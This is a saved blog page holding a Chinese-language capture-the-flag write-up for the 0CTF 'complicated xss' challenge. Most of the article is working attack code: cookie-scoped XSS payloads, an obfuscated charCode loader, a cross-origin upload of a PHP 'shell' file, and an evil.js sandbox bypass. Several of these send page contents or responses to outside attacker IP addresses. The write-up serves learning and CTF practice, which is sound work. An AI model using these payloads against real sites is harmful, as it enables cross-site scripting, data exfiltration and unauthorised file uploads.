<!DOCTYPE HTML>

<html>
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
<meta content="yes" name="apple-mobile-web-app-capable">
<title>0CTF-complicated xss - Veneno's Blog</title>
<link href="./0CTF-complicated xss - Veneno's Blog/highslide.css" rel="stylesheet" type="text/css"/>
<!--[if lt IE 7]>
<link rel="stylesheet" type="text/css" href="http://www.venenof.com/usr/plugins/HighSlide/css/highslide-ie6.css" />
<![endif]-->
<meta content="一直自己xss是弱鸡...总是找理由说自己没时间学...比赛时被队友教做人...题目截图：域名是government.vip，而题目说：The flag is in http://admin.g..." name="description">
<script type="text/javascript">
(function () {
    window.TypechoComment = {
        dom : function (id) {
            return document.getElementById(id);
        },
    
        create : function (tag, attr) {
            var el = document.createElement(tag);
        
            for (var key in attr) {
                el.setAttribute(key, attr[key]);
            }
        
            return el;
        },

        reply : function (cid, coid) {
            var comment = this.dom(cid), parent = comment.parentNode,
                response = this.dom('respond-post-314'), input = this.dom('comment-parent'),
                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
                textarea = response.getElementsByTagName('textarea')[0];

            if (null == input) {
                input = this.create('input', {
                    'type' : 'hidden',
                    'name' : 'parent',
                    'id'   : 'comment-parent'
                });

                form.appendChild(input);
            }

            input.setAttribute('value', coid);

            if (null == this.dom('comment-form-place-holder')) {
                var holder = this.create('div', {
                    'id' : 'comment-form-place-holder'
                });

                response.parentNode.insertBefore(holder, response);
            }

            comment.appendChild(response);
            this.dom('cancel-comment-reply-link').style.display = '';

            if (null != textarea && 'text' == textarea.name) {
                textarea.focus();
            }

            return false;
        },

        cancelReply : function () {
            var response = this.dom('respond-post-314'),
            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');

            if (null != input) {
                input.parentNode.removeChild(input);
            }

            if (null == holder) {
                return true;
            }

            this.dom('cancel-comment-reply-link').style.display = 'none';
            holder.parentNode.insertBefore(response, holder);
            return false;
        }
    };
})();
</script>
<script type="text/javascript">
(function () {
    var event = document.addEventListener ? {
        add: 'addEventListener',
        focus: 'focus',
        load: 'DOMContentLoaded'
    } : {
        add: 'attachEvent',
        focus: 'onfocus',
        load: 'onload'
    };

    document[event.add](event.load, function () {
        var r = document.getElementById('respond-post-314');

        if (null != r) {
            var forms = r.getElementsByTagName('form');
            if (forms.length > 0) {
                var f = forms[0], textarea = f.getElementsByTagName('textarea')[0], added = false;

                if (null != textarea && 'text' == textarea.name) {
                    textarea[event.add](event.focus, function () {
                        if (!added) {
                            var input = document.createElement('input');
                            input.type = 'hidden';
                            input.name = '_';
                            input.value = (function () {
    var _j99PM = ''///*'O'*/'O'
+/* '9'//'9' */''+'5f'//'IB3'
+''///*'FKQ'*/'FKQ'
+''///*'4qJ'*/'4qJ'
+'98'//'5t'
+'92d'//'kW'
+/* 'nU'//'nU' */''+'337'//'c'
+//'jB2'
'83'+//'y'
'0'+//'F'
'320'+//'HS'
'c'+//'7'
'8'+'AuK'//'AuK'
+'bc8'//'g'
+'b'//'8Zh'
+//'ArP'
'e3e'+//'F'
'2da'+//'Mk'
'fa'+'e'//'f5'
+''///*'fJe'*/'fJe'
+//'QA'
'QA'+'9'//'qO'
, _z7V = [[18,21],[31,33]];
    
    for (var i = 0; i < _z7V.length; i ++) {
        _j99PM = _j99PM.substring(0, _z7V[i][0]) + _j99PM.substring(_z7V[i][1]);
    }

    return _j99PM;
})();

                            f.appendChild(input);
                            added = true;
                        }
                    });
                }
            }
        }
    });
})();
</script><link href="./0CTF-complicated xss - Veneno's Blog/style.css" rel="stylesheet"/>
<link href="./0CTF-complicated xss - Veneno's Blog/prism.css" rel="stylesheet"/>
<link href="./0CTF-complicated xss - Veneno's Blog/iconfont.css" rel="stylesheet"/>
<link href="./0CTF-complicated xss - Veneno's Blog/player.css" rel="stylesheet"/>
<link href="" rel="shortcut icon"/>
</meta></meta></head>
<body>
<header>
<div class="main">
<div class="intro"> <img class="intro-logo" src="./0CTF-complicated xss - Veneno's Blog/veneno.jpeg"/> <span class="intro-sitename"><a href="http://www.venenof.com/">
      Veneno's Blog      </a></span> <span class="intro-siteinfo">
      The harder you struggle today,the more glorious you will be tomorrow.      </span> <span class="social"> <a href="" target="_blank"><i class="iconfont icon-qq"></i></a> <a href="" target="_blank"><i class="iconfont icon-mail"></i></a> <a href="" target="_blank"><i class="iconfont icon-weibo"></i></a> <a href="" target="_blank"><i class="iconfont icon-github"></i></a> </span> </div>
<nav>
<div class="collapse">
<i class="iconfont icon-menu"></i></div>
<ul class="bar">
<li><a href="http://www.venenof.com/">首页</a></li>
<li><a href="http://www.venenof.com/index.php/archive.html">
          时间          </a></li>
<li><a href="http://www.venenof.com/index.php/link.html">
          友链          </a></li>
<li><a href="http://www.venenof.com/index.php/Veneno.html">
          About Me          </a></li>
</ul>
</nav>
<a class="icon-search" id="btnChange" onclick="searchbox();"></a>
<div id="search" style="display:none">
<div class="icon-close" onclick="searchbox();"></div>
<form action="/index.php" class="search" id="searchform" method="get" name="form">
<input autofocus="autofocus" id="searchText" name="s" placeholder="输入关键字查找" style="margin-top:25%" type="search"/>
</form>
</div>
</div></header><content>
<div class="main">
<div class="article">
<div class="article-title">0CTF-complicated xss</div>
<small class="article-time">发表于： <time datetime="2017-03-21T11:43:00+00:00" itemprop="datePublished">2017-03-21</time> | 分类： <a href="http://www.venenof.com/index.php/category/CTF/">CTF</a>,<a href="http://www.venenof.com/index.php/category/Web/">Web</a> | <a href="http://www.venenof.com/index.php/archives/314/#comments" itemprop="discussionUrl">评论：0 </a> | 阅读：374</small>
<div class="article-content">
<p>一直自己xss是弱鸡...总是找理由说自己没时间学...比赛时被队友教做人...</p>
<hr/>
<p>题目截图：</p>
<p><img alt="12.png" src="./0CTF-complicated xss - Veneno's Blog/2609585924.png"/></p>
<p>域名是government.vip，而题目说：</p>
<pre><code>The flag is in http://admin.government.vip:8000
</code></pre>
<p>很明显，flag所在的地方是题目的一个子域。<br/>
很容易发现没有任何过滤，于是先本地nc监听一个端口，打一下，至于验证码都是老套路了：</p>
<pre><code class="language-php">Listening on [0.0.0.0] (family 0, port 9000)
Connection from [202.120.7.205] port 9000 [tcp/*] accepted (family 2, sport 57218)
GET / HTTP/1.1
Accept: */*
Referer: http://government.vip/data/69a387cfd6f0dc6a82f7eb0a4787c18e.html
User-Agent: Mozilla/5.0 Chrome(phantomjs) for 0ctf2017 by md5_salt
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en,*
Host: 150.95.140.32:9000
</code></pre>
<p>访问下:http://admin.government.vip:8000，test用户登陆后，在cookie中发现有趣信息：</p>
<p><img alt="123.png" src="./0CTF-complicated xss - Veneno's Blog/866233307.png"/></p>
<blockquote>
<p>跟小m学了一招，在console中打印cookie，如果有返回就说明不是httponly，显然这里session是httponly</p>
</blockquote>
<p>那么这个时候只有cookie中name是我们可以控制的，并且显示在前端，那么久极有可能存在XSS：</p>
<h2>Cooike作用域</h2>
<p>浏览器提交的Cookie需要满足以下两点：</p>
<ul>
<li>1.当前域名或者父域名下的Cookie；</li>
<li>2.当前路径或父路径下的Cookie。</li>
</ul>
<p>要满足以上两个条件的Cookie才会被提交。</p>
<hr/>
<p>既然如此，我们可以通过设置根域下的xss，然后admin在访问时就可以读到：</p>
<pre><code class="language-php">&lt;script&gt;document.cookie="username=&lt;svg onload=location.href='http://ip:port/?a='+escape(document.body.innerHTML)&gt;; path=/; domain=.government.vip";location.href='http://admin.government.vip:8000/';&lt;/script&gt;
</code></pre>
<p>成功读到源码后，发现是一个upload页面：</p>
<pre><code class="language-php">&lt;p&gt;Upload your shell&lt;/p&gt;
&lt;form action="/upload" method="post" enctype="multipart/form-data"&gt;
&lt;p&gt;&lt;input type="file" name="file"&gt;&lt;/p&gt;
&lt;p&gt;&lt;input type="submit" value="upload"&gt;
&lt;/p&gt;&lt;/form&gt;
</code></pre>
<p>于是下面就是利用ajax去跨域传文件,在自己的vps上传一个js文件，然后cookie内容即为执行这段js，然后将repose返回：</p>
<pre><code class="language-php">var t=document.getElementsByTagName("script")[0];
var sss=document.createElement("script");
sss.src="http://government.vip/static/jquery.min.js";
document.head.insertBefore(sss,t);

var body = "------WebKitFormBoundaryFikh4XTsUA3KuSES\r\n" +
  "Content-Disposition: form-data; name=\"233\"\r\n" +
  "\r\n" +
  "eyJzY3JlZW5faGVpZ2h0Ijo4MjYsInNjcmVlbl93aWR0aCI6MTQ0MH0\r\n" +
  "------WebKitFormBoundaryFikh4XTsUA3KuSES\r\n" +
  "Content-Disposition: form-data; name=\"source_flag\"\r\n" +
  "\r\n" +
  "0\r\n" +
  "------WebKitFormBoundaryFikh4XTsUA3KuSES\r\n" +
  "Content-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\n" +
  "Content-Type: image/png\r\n" +
  "\r\n" +
  "GIF89a\x3c?php phpinfo();?\x3e\x3c/script\x3e\r\n" +
  "------WebKitFormBoundaryFikh4XTsUA3KuSES--\r\n";

setTimeout("makeRequest()",1000)

function makeRequest() {
    var settings = {
        type: "POST",
        url:"http://admin.government.vip:8000/upload",
        data:body,
        success: function(data,textStatus) {
            $.get('http://104.160.43.154:12345?a=123+'+data);
        },
        headers: {
            "Access-Control-Allow-Headers":"X-Requested-With",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryFikh4XTsUA3KuSES",
            "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language":"zh-CN,zh;q=0.8"
        }
    };
    $.ajax(settings);
}
</code></pre>
<p>然后输入：</p>
<pre><code class="language-php">&lt;script&gt;
function setCookie(name, value, seconds) {
seconds = seconds || 0; //seconds有值就直接赋值，没有为0，这个根php不一样。
var expires = "";
if (seconds != 0 ) { //设置cookie生存时间
var date = new Date();
date.setTime(date.getTime()+(seconds*1000));
expires = "; expires="+date.toGMTString();
}
document.cookie = name+"="+value+expires+";path=/;domain=.government.vip"; //转码并赋值
}
setCookie('username','&lt;iframe onload=this.contentWindow.eval(String.fromCharCode(118,97,114,32,118,101,110,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,115,99,114,105,112,116,34,41,59,118,101,110,46,115,114,99,61,34,104,116,116,112,58,47,47,49,53,48,46,57,53,46,49,52,48,46,51,50,47,53,46,106,115,34,59,100,111,99,117,109,101,110,116,46,104,101,97,100,46,97,112,112,101,110,100,67,104,105,108,100,40,118,101,110,41,59))&gt;&lt;/iframe&gt;',1000)
location.href='http://admin.government.vip:8000/';
&lt;/script&gt;
</code></pre>
<p>这样vps监听就会收到flag：</p>
<p><img alt="12345.png" src="./0CTF-complicated xss - Veneno's Blog/3437199725.png"/></p>
<hr/>
<h2>bypass sanbox</h2>
<p>我们发现出题人定义了sanbox:</p>
<pre><code class="language-php">//sandbox
delete window.Function;
delete window.eval;
delete window.alert;
delete window.XMLHttpRequest;
delete window.Proxy;
delete window.Image;
delete window.postMessage;
</code></pre>
<p>其实这依旧能够绕过，小m的方法感觉很巧妙(膜：</p>
<blockquote>
<p>想到了 sandbox 只存在于 / ，而 /login 没有sandbox，我们可以构造两个 iframe ，让 / 去使用 /login<br/>
的 window.XMLHttpRequest 不就行了吗?</p>
</blockquote>
<p>这样的话，我们可以让admin访问后跳转到我们自己的页面，在我们自己的页面上我们设置如下内容：</p>
<pre><code class="language-php">&lt;iframe id="melody" src="http://admin.government.vip:8000/"&gt;&lt;/iframe&gt;
&lt;iframe id="m310dy" src="http://admin.government.vip:8000/login"&gt;&lt;/iframe&gt;
</code></pre>
<p>直接拿小m的poc了：</p>
<pre><code class="language-php">&lt;script&gt;
document.cookie='username=&lt;script src=//ip/evil.js&gt;&lt;\/script&gt;;domain=government.vip;Path=/';
location.href='http://xss.lt/upload.html';
&lt;/script&gt;
</code></pre>
<p>这样的话，cookie设置好后，会直接跳到upload.html，而upload的内容就是上面的两个iframe标签，这样的话就会包含两个页面的内联框架，于是就绕过了sanbox:)<br/>
evil.js内容：</p>
<pre><code class="language-php">function submitRequest()
      {
        window.XMLHttpRequest = window.top.frames[1].XMLHttpRequest;
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http://admin.government.vip:8000/upload", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "de-de,de;q=0.8,en-us;q=0.5,en;q=0.3");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------256672629917035");
        xhr.withCredentials = "true";
        var body = "-----------------------------256672629917035\r\n" +
          "Content-Disposition: form-data; name=\"message\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------256672629917035\r\n" +
          "Content-Disposition: form-data; name=\"backPage\"\r\n" +
          "\r\n" +
          "test\r\n" +
          "-----------------------------256672629917035\r\n" +
          "Content-Disposition: form-data; name=\"dataType\"\r\n" +
          "\r\n" +
          "test  \r\n" +
          "-----------------------------256672629917035\r\n" +
          "Content-Disposition: form-data; name=\"file\"; filename=\"test2.txt\"\r\n" +
          "Content-Type: text/plain\r\n" +
          "\r\n" +
          "test3\r\n" +
          "-----------------------------256672629917035--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i &lt; aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.onreadystatechange = function() {
            if (xhr.readyState == XMLHttpRequest.DONE) {
                location.href="http://119.29.135.206:23333/"+escape(xhr.responseText);
            }
        }
        xhr.send(new Blob([aBody]));
}
submitRequest();
</code></pre>
<hr/>
<p>还有第二种做法，是周老大的做法，表示自己太菜，暂时还没理解：</p>
<blockquote>
<p>要注意的是admin域做了一个sandbox<br/>
删除了xmlhttp的对象以及几个函数，此时我想到的是可以用iframe新建一个新的dom树，用javascript伪协议加载我们的代码，这样就可以避开这些限制</p>
</blockquote>
<hr/>
<p>感谢研究这个题的时候一众师傅对我的帮助...<br/>
也突然警醒，想起比赛时队友做出这个题的时候，说了一句：</p>
<blockquote>
<p>我好歹挖了一年的XSS</p>
</blockquote>
<p>不得不承认自己确实变得有些懒惰，反思反思，继续努力XD</p>
</div>
<div class="post-footer">
<div class=" post-tags">
<div class="tag"> 标签: none</div>
<div class="post-nav">
<li class="prev"><a href="http://www.venenof.com/index.php/archives/311/" title="Pwnhub-another php-WP ">Pwnhub-another php-WP </a></li>
<li class="next">
<a href="http://www.venenof.com/index.php/archives/324/" title="Pwnhub-小m的修仙题-WP&amp;反思">Pwnhub-小m的修仙题-WP&amp;反思</a></li>
</div>
</div>
</div>
</div></div></content>
<div id="comments">
<!-- Duoshuo Comment BEGIN -->
<div class="ds-thread" data-author-key="1" data-thread-key="314" data-title="0CTF-complicated xss" data-url=""></div>
<script type="text/javascript">
	var duoshuoQuery = {short_name:"veneno1",theme:"dark"};
	(function() {
		var ds = document.createElement("script");
		ds.type = "text/javascript";ds.async = true;
		ds.src = "http://static.duoshuo.com/embed.js";
		ds.charset = "UTF-8";
		(document.getElementsByTagName("head")[0] 
		|| document.getElementsByTagName("body")[0]).appendChild(ds);
	})();
	</script>
<!-- Duoshuo Comment END -->
</div>
</body></html>
﻿<div class="willerce">
<div> </div>
<!--播放器 -->
<div id="QPlayer">
<div id="pContent">
<div id="player"> <span class="cover"></span>
<div class="ctrl">
<div class="musicTag marquee"> <strong>Title</strong> <span> - </span> <span class="artist">Artist</span> </div>
<div class="progress">
<div class="timer left">0:00</div>
<div class="contr">
<div class="rewind icon"></div>
<div class="playback icon"></div>
<div class="fastforward icon"></div>
</div>
<div class="right">
<div class="liebiao icon"></div>
</div>
</div>
</div>
</div>
<div class="ssBtn">
<div class="adf"></div>
</div>
</div>
<ol id="playlist">
</ol>
</div>
<script src="./0CTF-complicated xss - Veneno's Blog/jquery.min.js"></script>
<script src="./0CTF-complicated xss - Veneno's Blog/jquery.marquee.min.js"></script>
<script>
	var	playlist = [	
];
  var isRotate = 1;
  var autoplay = ;  
</script>
<script src="./0CTF-complicated xss - Veneno's Blog/player.js"></script>
<script>
function bgChange(){
	var lis= $('.lib');
	for(var i=0; i<lis.length; i+=2)
	lis[i].style.background = 'rgba(246, 246, 246, 0.5)';
}
window.onload = bgChange;
</script>
<!--<div class="qrcode">
  <img src="" width="126" height="136" alt=""> </div>-->
<footer>
<p> <a href="" target="_blank">网站地图</a><br/>
Copyright © 2015-2017 <a href="http://www.venenof.com/">
    Veneno's Blog    
<script src="./0CTF-complicated xss - Veneno's Blog/highslide.packed.js" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
hs.graphicsDir = "http://www.venenof.com/usr/plugins/HighSlide/css/graphics/";
hs.fadeInOut = true;
hs.transitions = ["expand","crossfade"];
hs.lang.creditsText = "&copy; www.venenof.com";
hs.lang.creditsTitle = "&copy; www.venenof.com";
hs.creditsHref = "http://www.venenof.com/index.php";
hs.creditsPosition = "top left";
hs.lang={
loadingText : "载入中...",
loadingTitle : "取消",
closeText : "关闭",
closeTitle : "关闭 (Esc)",
previousText : "上一张",
previousTitle : "上一张 (←键)",
nextText : "下一张",
nextTitle : "下一张 (→键)",
moveTitle : "移动",
moveText : "移动",
playText : "播放",
playTitle : "幻灯播放 (空格键)",
pauseText : "暂停",
pauseTitle : "幻灯暂停 (空格键)",
number : "第%1张 共%2张",
restoreTitle :	"点击关闭或拖动. 左右方向键切换图片. ",
fullExpandTitle : "完整尺寸",
fullExpandText :  "原大"
};
//]]>
</script>
<script>
document.body.addEventListener('copy', function (e) {
    if (window.getSelection().toString() && window.getSelection().toString().length > 10) {
        setClipboardText(e);
    }
}); 
function setClipboardText(event) {
    var clipboardData = event.clipboardData || window.clipboardData;
    if (clipboardData) {
        event.preventDefault();
        var htmlData = ''
            + '著作权归作者所有。<br>'
            + '商业转载请联系作者获得授权，非商业转载请注明出处。<br>'
            + '作者：Veneno<br>'
            + '链接：' + window.location.href + '<br>'
            + '来源：http://www.venenof.com/<br><br>'
            + window.getSelection().toString();
        var textData = ''
            + '著作权归作者所有。\n'
            + '商业转载请联系作者获得授权，非商业转载请注明出处。\n'
            + '作者：Veneno\n'
            + '链接：' + window.location.href + '\n'
            + '来源：http://www.venenof.com/\n\n'
            + window.getSelection().toString();
        clipboardData.setData('text/html', htmlData);
        clipboardData.setData('text/plain',textData);
    }
}
</script>
</a></p></footer>
<div class="toTop">TOP</div>
<script src="./0CTF-complicated xss - Veneno's Blog/all.js"></script>
<script src="./0CTF-complicated xss - Veneno's Blog/jquery.js"></script>
<script src="./0CTF-complicated xss - Veneno's Blog/prism.js"></script>
<script src="./0CTF-complicated xss - Veneno's Blog/search.js"></script>
</div>

